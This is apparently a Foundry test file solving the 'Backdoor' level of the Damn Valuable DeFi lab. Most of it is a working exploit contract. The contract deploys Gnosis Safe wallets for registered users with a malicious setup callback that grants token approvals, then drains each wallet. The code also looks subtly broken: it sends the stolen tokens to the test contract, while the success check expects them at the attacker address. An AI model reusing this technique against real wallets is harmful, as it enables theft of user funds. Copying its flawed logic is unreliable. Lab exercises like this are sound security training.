// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "test/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "src/DamnValuableToken.sol";
import {WalletRegistry} from "src/backdoor/WalletRegistry.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
import {IProxyCreationCallback} from "gnosis/proxies/IProxyCreationCallback.sol";

contract AttackerContract {

    DamnValuableToken internal dvt;
    GnosisSafe internal masterCopy;
    GnosisSafeProxyFactory internal walletFactory;
    WalletRegistry internal walletRegistry;


    constructor(address payable masterAddr, address factoryAddr,
        address walletRegAddr, address tokenAddr)
    {
        masterCopy = GnosisSafe(masterAddr);
        walletFactory = GnosisSafeProxyFactory(factoryAddr);
        walletRegistry = WalletRegistry(walletRegAddr);
        dvt = DamnValuableToken(tokenAddr);
    }

    function tokenApprove(address user) external {
        dvt.approve(user, 10 ether);
    }

    ///can create the users gnosis safe wallet for them with callback that will
    ///allow us to take their tokens
    function setupProxies(address[] memory users) external {

        for (uint256 i = 0; i < 4; i++) {
            address[] memory user = new address[](1);
            user[0] = users[i];

            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector, 
                user,
                1,
                address(this),
                abi.encodeWithSignature("tokenApprove(address)", 
                    address(this)),
                address(0),
                0,
                0,
                0
            );

            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
                address(masterCopy),
                initializer,
                i,
                walletRegistry
            );

            console2.log("balance of proxy", i, dvt.balanceOf(address(proxy)));
            dvt.transferFrom(address(proxy), msg.sender, 10 ether);
        }
    }
}


contract Backdoor is Test {
    uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
    uint256 internal constant NUM_USERS = 4;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    GnosisSafe internal masterCopy;
    GnosisSafeProxyFactory internal walletFactory;
    WalletRegistry internal walletRegistry;
    address[] internal users;
    address payable internal attacker;
    address internal alice;
    address internal bob;
    address internal charlie;
    address internal david;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(NUM_USERS);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = new GnosisSafe();
        vm.label(address(masterCopy), "Gnosis Safe");

        walletFactory = new GnosisSafeProxyFactory();
        vm.label(address(walletFactory), "Wallet Factory");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(dvt),
            users
        );

        // Users are registered as beneficiaries
        for (uint256 i = 0; i < NUM_USERS; i++) {
            assertTrue(walletRegistry.beneficiaries(users[i]));
        }

        // Transfer tokens to be distributed to the registry
        dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        AttackerContract attack = new AttackerContract(payable(masterCopy),
            address(walletFactory),
            address(walletRegistry),
            address(dvt));
        attack.setupProxies(users);
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        for (uint256 i = 0; i < NUM_USERS; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            if (wallet == address(0)) {
                emit log("User did not register a wallet");
                fail();
            }

            // User is no longer registered as a beneficiary
            assertTrue(!walletRegistry.beneficiaries(users[i]));
        }

        // Attacker must have taken all tokens
        assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
    }
}